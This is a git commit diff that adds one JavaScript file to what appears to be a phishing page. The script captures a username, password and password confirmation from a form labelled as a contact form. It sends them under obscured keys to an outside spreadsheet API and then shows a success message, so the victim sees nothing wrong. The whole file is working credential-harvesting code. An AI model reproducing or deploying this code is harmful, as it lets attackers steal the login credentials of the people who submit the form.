ed97f81f5c70983afb64c75015eb73c164effe1e
mx-port <cyclemoor4@gmail.com>
2024-11-14 20:10:19 -0600

    add files upload

---
+++ inv/js/1236in.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/2ca98c60-add4-45e9-a79e-4e31133b4d06', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "a": formulario.usuario.value,
+            "b": formulario.contraseña.value,
+            "c": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
